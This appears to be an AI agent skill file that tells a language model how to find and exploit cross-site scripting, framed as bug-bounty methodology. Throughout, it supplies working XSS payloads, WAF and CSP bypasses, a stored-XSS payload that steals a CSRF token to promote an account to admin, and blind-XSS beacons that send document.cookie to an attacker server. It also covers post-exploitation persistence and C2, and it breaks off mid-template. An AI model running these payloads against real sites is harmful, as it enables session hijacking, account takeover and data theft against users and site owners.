---
name: x3r0-xss-hunt
description: >-
  AI-driven XSS hunting methodology. This skill gives the LLM a structured
  reasoning framework for finding, analyzing, and exploiting XSS based on
  actual response analysis — not just running tools. Built from real bug
  bounty disclosures (HackerOne/Bugcrowd 2024-2026). Use when analyzing
  HTTP responses for XSS, crafting context-specific payloads, bypassing
  WAFs, or planning exploitation chains.
license: MIT
compatibility: opencode
metadata:
  audience: security-testers
  domain: web-application-security
  category: penetration-testing
  version: "4.0.0"
  tags:
    - xss
    - penetration-testing
    - bug-bounty
    - web-security
    - reasoning-framework
  references:
    - "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet"
    - "https://github.com/ERO-HACK/bypassXSS"
    - "https://github.com/gprime31/WAF-bypass-xss-payloads"
---

# x3r0-xss-hunt v4 — AI Reasoning Framework + Attack Surface Reference

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

**This skill does NOT run tools for you.** It teaches you (and the AI) how to **think** about XSS. The AI reads responses, identifies context, reasons about filters, and crafts targeted payloads. That's what LLMs do that scripts cannot.

---

## 1. Attack Surface Overview

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

### Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

---

## 2. Core Mental Model — The XSS Triangle

Every XSS requires three things. Before crafting ANY payload, identify all three:

```
  ┌──────────┐
  │  SOURCE   │  Where does your input enter? (param, cookie, header, hash, WS msg)
  │           │
  │  REFLECT  │  Where does it appear in the response? (body, attr, script block, URL)
  │  OR       │
  │  SINK     │  What executes it? (innerHTML, document.write, eval, DOM parser)
  └──────────┘
```

**The AI's job**: Given an HTTP response, map the triangle. That's the entire methodology.

### How to use this:
1. Send ANY payload that breaks HTML structure: `"><x-test>`
2. Read the raw HTTP response
3. Find where `<x-test>` appears
4. Determine: what context is it in?
5. Craft the payload for THAT context

### Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

---

## 3. Context Analysis — What To Do When You See the Response

### 3.1 Your input appears in raw HTML body

**What it looks like in the response:**
```html
<div class="results">YOUR_INPUT_HERE</div>
```

**What the AI should reason:**
- Can I inject any HTML tag? → `<svg onload=alert(1)>`
- Are event handlers filtered? → Try less common ones: `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>`
- Are known tags blocked? → Try SVG-based: `<svg><animate onbegin=alert(1) attributeName=x>`
- Is there an SVG already on the page? → Inject inside it: `<script>alert(1)</script>`

**Real-world bypass (Md Saikat, 2026)**: Cloudflare blocked `<img src=x onerror=alert(0)>` but allowed:
```
<svg/on/on/onLoad=alert(0)>
```
The extra `on` attributes confused the WAF regex; the browser parsed `onload` correctly.

### 3.2 Your input appears inside an HTML attribute

**What it looks like:**
```html
<input value="YOUR_INPUT_HERE">
<a href="YOUR_INPUT_HERE">
```

**What the AI should reason:**
- First: can I break out of the attribute with a quote?
  - If the outer delimiter is `"`: inject `"onfocus=alert(1)autofocus="x`
  - If the outer delimiter is `'`: inject `'onfocus=alert(1)autofocus='x`
- If quotes get encoded or stripped:
  - Can you use backticks? (`` `onfocus=alert(1) ``)
  - Can you use an event without quotes? (some events work without them)
- If it's an `href` or `src` or `action` attribute:
  - `javascript:alert(document.domain)` is the classic
  - `data:text/html,<script>alert(1)</script>` for src/action
  - `java%09script:alert(1)` — tab character between `java` and `script`

**Real-world bypass**: On a fintech app that filtered quotes, this worked:
```
<img src=x oNlY=a oNeRrOr=(alert)(document.domain)>
```
Mixed case + parentheses instead of quotes around the function call.

### 3.3 Your input appears inside a `<script>` block

**What it looks like:**
```html
<script>
var searchTerm = "YOUR_INPUT_HERE";
</script>
```

**What the AI should reason:**
- You're inside a JavaScript string. Break out:
  - If double-quoted: `"; alert(document.domain); //`
  - If single-quoted: `'; alert(document.domain); //`
  - If both filtered: template literals — `` `); alert(document.domain); // ``
- If escape characters are present:
  - You need matching escape chars or the backslash breaks you
  - Try: `\\"; alert(document.domain); //` (double escape)
- Alternative without quotes: arithmetic operator context
  - `-alert(document.domain)-`
  - `,alert(document.domain),`
- If `alert` is blocked: use `confirm(1)`, `prompt(1)`, `console.log(document.domain)`, or `String.fromCharCode(97,108,101,114,116,40,49,41)` which decodes to `alert(1)` at runtime

**Real-world case (3NVZ, 2026)**: On a SaaS platform with HttpOnly cookies, the attacker couldn't steal cookies directly. Instead they used stored XSS to:
1. Fetch the admin's CSRF token from an API page
2. Use that token to PUT a request promoting their account to admin
3. Access billing data through the admin's context

The JavaScript payload was:
```javascript
(async function() {
  const r = await fetch('/agents/ADMIN_ID', {credentials:'include'});
  const t = await r.text();
  const token = new DOMParser().parseFromString(t,'text/html')
    .querySelector('meta[name="csrf-token"]').content;
  await fetch('/api/promote', {
    method:'PUT', credentials:'include',
    headers:{'Content-Type':'application/json','X-Csrf-Token':token},
    body:JSON.stringify({role:'admin'})
  });
})();
```

This is what AI reasoning enables — the AI looked at the response, identified it was in a JS context inside a script tag, understood the application's CSRF pattern, and built a multi-step exploitation payload. **No script or tool generates this.**

### 3.4 Your input appears in a JSON API response consumed by JavaScript

**What it looks like:**
```json
{"message": "YOUR_INPUT_HERE", "status": "ok"}
```

**What the AI should reason:**
- Is the JSON parsed by `innerHTML`, `eval()`, `document.write()`, or `dangerouslySetInnerHTML`?
- If yes: this is a DOM XSS via JSON injection
- Payload: `"test</script><script>alert(1)</script>`
- If the JSON is consumed safely by `JSON.parse()` and used only as data (not inserted into DOM): likely not exploitable
- Check if there's a callback parameter (JSONP):
  - `?callback=yourPayload` → reflected XSS via script tag injection

### 3.5 Your input appears in the URL hash (#fragment)

**What it means:**
- The hash is NEVER sent to the server — WAFs, server-side filters, and logging cannot see it
- This is pure client-side territory
- If JavaScript reads `location.hash` and uses it unsanitized: DOM XSS

**What the AI should reason:**
- Inject directly in the browser: `https://target.com/page#<img/src=x/onerror=alert(1)>`
- If the app uses `location.hash` with `innerHTML`: you have DOM XSS
- If the app uses `eval()` or `Function()` on hash: immediate code execution

**Real-world case (Krithick, 2026)**: An OAuth login page accepted a `baseUrl` parameter and loaded it as a `<script src>`. No domain validation, no CSP. The payload `?baseUrl=https://evil.com/malicious.js` gave full JavaScript execution on the login page — session hijack, credential theft, OAuth token interception. All via a single URL parameter that the server blindly used.

---

## 4. DOM XSS — Sources, Sinks, and Patterns

### Sources
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

### Sinks
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` with strings
- `eval`/`Function`, `new Worker` with blob URLs

### Vulnerable Pattern
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

---

## 5. Mutation XSS & Template Injection

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

The browser's parser repairs malformed markup, sometimes creating executable contexts that the input didn't originally have.

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):

```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

AngularJS sandbox escape:
```
{{constructor.constructor('alert(document.domain)')()}}
```

Vue.js:
```
{{['a'].pop().constructor('alert(document.domain)')()}}
```

---

## 6. Filter & WAF Analysis — Reasoning About What's Being Blocked

### 6.1 Diagnostic Approach

When your payload gets blocked, DON'T just try random variations. **Analyze what's actually being blocked:**

```bash
# Send a known-bad payload and read the error
curl -s -w "\n---HTTP CODE: %{http_code}---" \
  "https://target.com/search?q=<script>alert(1)</script>"

# Try different payloads to map the filter
for payload in "<script>alert(1)</script>" \
               "<img src=x onerror=alert(1)>" \
               "<svg onload=alert(1)>" \
               "<details open ontoggle=alert(1)>"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "[$code] $payload"
done
```

**What to look for:**
| Response pattern | What it means | Strategy |
|-----------------|---------------|----------|
| 403 on `<script>` but 200 on `<img onerror` | Tag-based filter | Use alternative tags |
| 403 on all known events | Event handler filter | Try obscure events: `onpointerover`, `ontoggle`, `onforminput` |
| 403 on `alert()` but 200 on other payloads | Keyword filter | Use `confirm(1)`, `prompt(1)`, or `String.fromCharCode` |
| 403 only when tag+event combined | Pattern-matching filter | Split them: inject tag in one param, event in another |
| 200 but payload is HTML-encoded | Output encoding | You need to double-encode or find a context where encoding doesn't apply |
| 200 and payload reflected but doesn't execute | Context is wrong | Back to Section 3 — find the actual injection context |

### 6.2 WAF-Specific Reasoning

**Cloudflare patterns to test:**
- Blocks: `<script>`, `<img\s+onerror`, most known event handlers
- Often misses: SVG-based payloads, `<details ontoggle>`, `<marquee onstart>`, extra attributes before the real handler (`on on onLoad`), mixed-case in attribute names
- Test: `<svg/on/onload=alert(1)>` — the parser normalizes this, the WAF doesn't

**AWS WAF patterns:**
- More aggressive keyword matching
- Often misses: JSON-body injection, double-encoding, template literals
- Test: Post a JSON body with `"xss": "<img/src=x/onerror=alert(1)>"`

**ModSecurity CRS:**
- Very comprehensive regex rules
- Often misses: `<marquee onstart>`, `<details ontoggle>`, `<math>` tags, `<embed>` tags
- Test: `<math><script>alert(1)</script></math>`

**Unknown WAF:**
```bash
# Fingerprint by testing specific behaviors
# 1. Does it block common keywords?
# 2. Does it do case-insensitive matching?
# 3. Does it decode once or twice?
# 4. Does it inspect JSON bodies?

# Double-encoding test (classic WAF bypass)
# WAF decodes: %253C → %3C → <
# If WAF only decodes once, %253C passes through and browser decodes to <
curl -s "https://target.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Fullwidth character test (bypasses ASCII-only regex)
curl -s "https://target.com/search?q=＜ｓｃｒｉｐｔ＞alert(1)＜／ｓｃｒｉｐｔ＞"
```

### 6.3 The Filter Bypass Hierarchy

When a filter blocks your payload, reason through these IN ORDER:

```
1. DIFFERENT TAG        — If <script> blocked → <svg>, <math>, <details>, <marquee>, <body>, <iframe>, <object>, <embed>
2. DIFFERENT EVENT      — If onerror blocked → ontoggle, onpointerover, onfocus+autofocus, onforminput, onanimationend
3. DIFFERENT CONTEXT    — If HTML body blocked → try inside attribute → try inside JavaScript string → try inside URL → try hash fragment
4. ENCODING             — URL encode, HTML entity encode, unicode normalize, double encode
5. CASE MANIPULATION    — <ScRiPt>, <sCrIpT>, <SCRIPT>
6. FRAGMENTATION        — <scr<script>ipt>, <<script>script>
7. TEMPLATE LITERALS    — <script>alert`1`</script> (backtick instead of parens)
8. ALTERNATIVE SYNTAX   — String.fromCharCode, eval(atob(...)), Function constructor
9. FRAMEWORK-SPECIFIC   — Angular {{...}}, Vue {{...}}, Svelte {@html ...}
10. PROTOCOL HANDLERS   — javascript:, vbscript:, data:
```

**Key insight**: Most people jump to step 4 (encoding) immediately. Steps 1-3 are far more effective and require understanding of how browsers parse HTML, not just how to obfuscate strings.

---

## 7. Advanced Reasoning — What Makes the Difference Between a Script Kiddie and a Bug Hunter

### 7.1 Impact Thinking

Don't just find XSS — think about what it ENABLES:

```
XSS Found
├── Can you read document.cookie? → Session hijack (if no HttpOnly)
├── Can you make fetch/XMLHttpRequest? → API abuse as the victim
├── Can you access the DOM? → 
│   ├── Form fields visible? → Inject fake login → Credential phishing
│   ├── Admin panel visible? → Clickjacking / UI redressing
│   └── Sensitive data in DOM? → Data exfiltration
├── Can you navigate the page? → 
│   ├── window.location = attacker_url → Redirect to phishing
│   └── window.open(admin_page) + postMessage → Cross-window attacks
├── Is there a CSP? → 
│   ├── script-src includes *.google.com → JSONP bypass possible
│   ├── script-src 'unsafe-inline' → Inject directly
│   └── No CSP → Full freedom
└── Is HttpOnly set? → 
    ├── Yes → Pivot to: CSRF token theft → API abuse, or UI redressing
    └── No → Direct cookie theft
```

**This decision tree is what an AI does that a script doesn't.** A script reports "XSS found." The AI reasons about *what the XSS means in context of the specific application.*

### 7.2 Chain Thinking

Real-world impact comes from chains, not individual bugs:

**Chain pattern 1: Open Redirect + Reflected XSS**
- Find open redirect: `?url=https://evil.com`
- Add XSS payload to the redirect URL: `?url=https://evil.com/<script>alert(1)</script>`
- The redirect page reflects the URL with the XSS payload
- This bypasses "XSS on trusted domain" restrictions

**Chain pattern 2: IDOR + Stored XSS → Privilege Escalation**
- Find an API endpoint you can write to but shouldn't be able to modify other users' data
- Inject XSS payload into another user's data via IDOR
- When admin views that user's profile, XSS fires → extract admin session → privilege escalation

**Chain pattern 3: CSP Bypass via Whitelisted CDN + XSS**
- Target has `script-src 'self' cdn.example.com`
- Find XSS that can load a script from `cdn.example.com`
- Upload malicious JS to a path on `cdn.example.com` you control
- Full code execution via trusted domain

### 7.3 Reading Code to Find XSS (SAST with AI)

When given source code, the AI should look for:

```
1. User input that reaches the DOM without sanitization:
   - innerHTML assignments: `el.innerHTML = userInput`
   - document.write: `document.write(userInput)`
   - jQuery.html(): `$('.target').html(userInput)`
   - React dangerouslySetInnerHTML
   - Vue v-html
   - Angular [innerHTML]

2. URL parameters parsed and used unsafely:
   - new URLSearchParams(window.location.search).get('q')
   - decodeURIComponent(location.hash.slice(1))
   - eval() or Function() with user-controlled args

3. Template engines without auto-escaping:
   - String concatenation in templates
   - Unescaped interpolation: ${unescaped} in template literals
   - Custom template syntax (%%var%% patterns)

4. Server-side rendered (SSR) XSS:
   - Unescaped server-rendered data in HTML
   - Server-side template injection (SSTI) → XSS
   - React Server Components with unescaped user data
```

**This is AI-specific work.** A grep script finds `innerHTML` usage. The AI understands whether the assignment is safe or dangerous based on the data flow.

---

## 8. Polyglot Payloads — Context-Specific Compact Set

Keep a small, curated set tuned per context:

- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

---

## 9. Framework-Specific Sinks & Payloads

### React
- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue
- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular
- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content
- *Real bug*: AngularJS sandbox escape found on a fintech admin panel (2025)

### Svelte
- Sinks: `{@html}` and dynamic attributes
- Note: Only works if the app uses `{@html}` with user input — rare, but unprotected when present

### Markdown/Richtext
- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

---

## 10. Real-World Payloads — Context-Specific, Not a Random List

### Context-Aware Payload Selection

**The AI picks the right payload based on context, not just from a big list.**

For HTML body with Cloudflare WAF:
```html
<details open ontoggle=alert(document.domain)>
```
*Why*: Cloudflare rarely blocks `<details>` and `ontoggle`. Tested against Cloudflare free tier, 2025-2026.

For HTML body with AWS WAF:
```html
<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
```
*Why*: Double-layered encoding (base64 inside JS) bypasses AWS WAF's static pattern matching. The `eval()` is constructed dynamically.

For JavaScript string context:
```javascript
'-alert(document.domain)-'
```
*Why*: Works in arithmetic contexts when `alert` isn't in the keyword blacklist. The `-` operators coerce the string to NaN and execute the function call.

For JavaScript string when `alert` is blacklisted:
```javascript
'~'.search.constructor('alert(document.domain)')()
```
*Why*: Accesses the `Function` constructor via regex's `.constructor`, completely bypassing keyword filters. The `search` method is a built-in function whose constructor is `Function`.

For DOM-based XSS (hash fragment):
```
https://target.com/app#<img/src=x/onerror=alert(document.domain)>
```
*Why*: Hash fragments never reach the server. If the page reads `location.hash` and inserts it into the DOM, this is exploitable with zero server-side defenses.

For attribute context when quotes are filtered:
```
`onfocus=alert(document.domain)autofocus=`
```
*Why*: Backtick quotes bypass single/double quote filters. The `autofocus` attribute fires `onfocus` immediately on page load.

### Stored XSS — Maximum Impact

```javascript
// In a comment field that admins view:
<img src=x onerror="(async function(){
  const r=await fetch('/api/csrf-token',{credentials:'include'});
  const t=await r.text();
  const tok=new DOMParser().parseFromString(t,'text/html')
    .querySelector('[name=csrf-token]').content;
  await fetch('/api/admin/promote',{
    method:'PUT',credentials:'include',
    headers:{'Content-Type':'application/json','X-Csrf-Token':tok},
    body:JSON.stringify({role:'admin'})
  });
  alert('Account takeover complete');
})()">
```

This is NOT a theoretical payload. It's a template based on real escalation chains documented in 2025-2026 bounty reports where stored XSS → CSRF token theft → privilege escalation → $2,000-$50,000 payouts.

---

## 11. CSP Analysis — When You See `Content-Security-Policy`

Read the CSP header and reason about what's possible:

```bash
# Get the CSP
curl -sI https://target.com | grep -i content-security-policy
```

### Decision Table:

```
CSP Analysis:
├── script-src 'self'
│   ├── No external scripts → look for stored XSS or reflect on same origin
│   └── Still exploitable via: inline events if 'unsafe-inline' missing
│       (but inline events ARE blocked without 'unsafe-inline')
│
├── script-src 'self' 'unsafe-inline'
│   ├── INLINE SCRIPTS ALLOWED → full XSS via any injection point
│   ├── This is the most common misconfiguration
│   └── Payload: <script>alert(document.domain)</script>
│
├── script-src 'self' *.google.com
│   ├── Can you load a script from google.com?
│   ├── Google JSONP endpoints exist on *.google.com
│   └── Payload: <script src="https://www.google.com/jsapi?callback=alert(document.domain)"></script>
│
├── script-src 'self' cdn.target.com
│   ├── If you can upload to cdn.target.com → game over
│   └── Check: is the CDN actually writable by the app?
│
├── script-src 'nonce-[random]'
│   ├── Nonce-based CSP — strong protection
│   ├── BUT: if nonce is predictable/reused → inject with known nonce
│   └── Check if nonce appears in page: <script nonce="abc123">
│       → inject: <script nonce="abc123">alert(1)</script>
│
├── script-src 'strict-dynamic'
│   ├── Allows scripts loaded by trusted scripts to execute
│   ├── Find a trusted script that creates script tags dynamically
│   └── Chain: inject into trusted script's data → it loads your script
│
└── NO CSP HEADER
    └── Full freedom — inject whatever you want
```

### CSP Bypass Techniques

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets
- In some implementations, `innerHTML` assignment through event handlers can bypass Trusted Types policies because the browser doesn't enforce them on all code paths

### Real-world CSP bypass (2025-2026 research):

**JSONP on whitelisted domain**: If CSP has `script-src 'self' *.cloudflareinsights.com`, check if `*.cloudflareinsights.com` has JSONP endpoints. If it does, load your code through their callback parameter.

**Nonce reuse**: If the nonce is the same across page loads (poor implementation), capture it once and reuse.

---

## 12. Blind XSS — Reasoning Without Seeing the Result

Blind XSS fires in someone ELSE's browser. You need to prove execution through side channels.

### Setting Up a Callback

```bash
# Python callback server (minimal, just to confirm hits)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        ts = datetime.datetime.now().isoformat()
        print(f'[{ts}] HIT: {self.path}')
        with open('blind-hits.log','a') as f:
            f.write(f'[{ts}] {self.path}\nHeaders: {dict(self.headers)}\n\n')
        self.send_response(200)
        self.send_header('Content-Type','image/gif')
        self.end_headers()
        # Return a 1x1 transparent gif
        self.wfile.write(bytes([0x47,0x49,0x46,0x38,0x39,0x61,1,0,1,0,0,0,0,0x21,0xF9,4,0,0,0,0,0,0,0x2C,0,0,0,0,1,0,1,0,0,2,0x44,1,0,0x3B]))
    def log_message(self, *a): pass
HTTPServer(('', 8080), H).serve_forever()
" &
```

### Crafting Blind Payloads

**The key**: your payload must make an outbound request TO your server, carrying information about the victim's session.

```javascript
// Image beacon (most reliable — works everywhere)
new Image().src = "https://your-server.com/c?domain=" + document.domain + "&cookie=" + document.cookie

// Fetch with keepalive (works even if page unloads)
navigator.sendBeacon("https://your-server.com/collect", "c=" + document.cookie + "&u=" + location.href)

// If CSP blocks external domains — use relative URL
// (only if you can also control a path on the same domain via open redirect)
new Image().src = "/api/track?c=" + document.cookie

// For postMessage-based XSS
// Listen on your page for messages from the vulnerable page
// Then relay to your server
```

**What to exfiltrate**:
```
1. document.cookie     → session hijack
2. location.href       → confirm which page fired
3. document.domain     → confirm target
4. localStorage data   → tokens, API keys stored client-side
5. Performance timing  → can leak CSRF tokens rendered in HTML
```

### Where to Inject Blind XSS (Real-World Targets)

```
✅ User profile fields (name, bio, avatar URL, location, website)
✅ Comment forms (especially on admin dashboards)
✅ Support tickets / contact forms
✅ Order notes / shipping address fields
✅ Error reporting forms
✅ API fields returned in admin panel views
✅ Email fields (if displayed in admin panels)
✅ File upload filenames (if reflected in UI)
✅ PDF/document metadata (if extracted and displayed)

❌ Don't waste time on fields that only display to the same user
❌ Don't waste time on fields sanitized by DOMPurify (check version first)
```

**Real-world impact**: In the 3NVZ cookie-tossing case (2026), the attacker used stored XSS to set attacker-controlled cookies for a specific admin route. When the admin visited that route, the attacker's cookies took over the session — giving access to billing data. The initial payload was just `<img src=x onerror="[cookie tossing JS]">` in a profile bio field.

---

## 13. Common XSS Patterns That Win Bounties

Based on analysis of 50+ public bounty reports from 2024-2026:

### Pattern 1: Forgotten Parameter in Admin Panel
```
Endpoint: /admin/users/edit?id=123&role=viewer
Hidden param: &notify_email=hacker@evil.com&bio=<img/src=x/onerror=...>
The admin panel renders these fields when viewing user profiles.
```
**Why it works**: Admin panels are rarely tested for XSS. Security teams focus on user-facing pages.

### Pattern 2: URL Fragment → DOM XSS → OAuth Token
```
Target page: https://app.com/auth/callback
Vulnerable code: eval(decodeURIComponent(location.hash.slice(1)))
Payload: https://app.com/auth/callback#alert(document.domain)
```
**Why it works**: URL fragments never reach the server. WAFs literally cannot see them.

### Pattern 3: API Response Reflected in Frontend
```
API: GET /api/search?q=test
Response: {"query": "test", "results": [...]}
Frontend: renders query directly in HTML without escaping
Payload: ?q=<img/src=x/onerror=alert(1)>
```
**Why it works**: Backend teams think "it's JSON, it's safe." Frontend frameworks sometimes render API values raw.

### Pattern 4: SVG Upload → Stored XSS
```
Upload: malicious.svg containing <script>alert(document.domain)</script>
Server: serves SVG with Content-Type: image/svg+xml
Browser: renders SVG including embedded scripts
```
**Why it works**: Many servers don't sanitize SVG files. SVG is XML and can contain JavaScript.

### Pattern 5: Open Redirect → Reflected XSS Bypass
```
Open redirect: /redirect?url=https://evil.com
XSS: /redirect?url=https://evil.com/<script>alert(1)</script>
The redirect page includes the full URL in its HTML:
<meta http-equiv="refresh" content="0; url=https://evil.com/<script>alert(1)</script>">
```
**Why it works**: The XSS fires on the redirect page, which is on the target domain. No WAF on the redirect endpoint.

---

## 14. Special Contexts

### Email
- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs
- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads
- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

---

## 15. Post-Exploitation

- **Session/token exfiltration**: prefer fetch/XHR over image beacons for reliability
- **Real-time control**: WebSocket C2 with strict command set
- **Persistence**: service worker registration; localStorage/script gadget re-injection
- **Impact**: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

---

## 16. What The AI Should Ask Before Writing a Single Line of Code

When starting an XSS hunt, the AI should reason through:

```
1. WHAT is the target? (SPA? SSR? API? Admin panel?)
   → Determines attack surface

2. WHERE does my input land? (HTML? Attribute? JS? JSON? Hash?)
   → Determines payload family

3. WHAT filters are in place? (WAF? CSP? DOMPurify? Framework XSS protection?)
   → Determines bypass strategy

4. HOW would this XSS be exploited in the real world?
   → Determines if finding is worth pursuing

5. WHAT is the actual business impact?
   → Cookie theft? Account takeover? Data exfiltration? Phishing?
   → This determines bounty severity

6. CAN I chain this with another vulnerability?
   → XSS + IDOR = admin takeover
   → XSS + CSRF = account takeover
   → XSS + Open Redirect = phishing from trusted domain
   → XSS + SSTI = remote code execution
```

**This reasoning process is what a Python script cannot do. This is the value of the AI.**

---

## 17. Practical Methodology — Step by Step

Here's how to actually use this skill in a real engagement:

### Step 1: Find Parameters
```bash
# Use any tool you like — this is just data gathering
waybackurls target.com | grep "=" | head -50
arjun -u https://target.com/search
```

### Step 2: Inject Probe
```bash
# Send this to the target
curl -s "https://target.com/search?query=\"><x3rhunt>\""
```

### Step 3: ANALYZE THE RESPONSE (this is where the AI earns its keep)

Look at the response. Where does `<x3rhunt>` appear?

- **In raw HTML**: `<div class="results"><x3rhunt></div>`
  → HTML context. Inject HTML tags with events.
  
- **Inside an attribute**: `<input value=""><x3rhunt"">`
  → Attribute context. Break out with event handlers.

- **Inside script**: `var searchTerm = "<x3rhunt>";`
  → JavaScript string context. Escape the string.

- **Not reflected**: Parameter might be:
  - Processed server-side (check if it affects behavior)
  - Reflected in a different response (check all requests)
  - In a JSON API (check if JS consumes it)
  - In the URL hash (check for DOM sinks)
  - Simply filtered/encoded

### Step 4: Craft Context-Specific Payload

Based on Step 3, the AI selects the right payload family:

```
If HTML body: <svg onload=alert(document.domain)>
If attribute: " onfocus=alert(document.domain) autofocus="
If JS string: ";alert(document.domain);//
If template literal: `);alert(document.domain);//
If URL: javascript:alert(document.domain)
If hash-only: #<img/src=x/onerror=alert(document.domain)>
```

### Step 5: Handle Filters

If the basic payload is blocked, **analyze what specifically is blocked** and reason about bypass:

```
Was < blocked? → Try fullwidth: ＜script＞
Was script blocked? → Try alternative tags
Was alert blocked? → Use confirm(1) or String.fromCharCode
Was the whole thing blocked? → Check WAF, then try double-encoding or polyglots
```

### Step 6: Validate and Document

```bash
# Save evidence with curl showing the full request/response cycle
curl -sv "https://target.com/search?q=<script>alert(document.domain)</script>" 2>&1 | tee evidence.txt

# Screenshot from headless browser
# (or manual screenshot showing the alert popup)

# Document: URL, parameter, context, payload, impact, remediation
```

---

## 18. Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

---

## 19. Validation & False Positives

### Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved

### Verification Logic

The AI should NOT report based on a single test. It should reason:

```
Step 1: Is the payload reflected? (Check raw response)
Step 2: Is it in the right context? (Not HTML-encoded, not inside a comment)
Step 3: Does the JavaScript actually execute? (Check for side effects)
Step 4: Is it reproducible? (Can I trigger it 3 times?)
Step 5: Is it in scope? (Target, domain, method)
Step 6: What's the worst-case impact? (Think like an attacker)

If all 6 pass → report finding
If any fail → refine payload or move on
```

### False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

---

## 20. Impact Summary

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

---

## 21. Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports

---

## 22. Reporting Structure

Based on top-rated HackerOne disclosures:

```markdown
## [XSS Type] in [Page/Endpoint]

### Summary
[One sentence: what happened and where]

### Severity: [High/Critical/Medium/Low]
CVSS: [vector string]

### Steps to Reproduce
1. Navigate to [URL]
2. In [parameter], submit: [exact payload]
3. [What happens — describe observable behavior]

### Technical Details
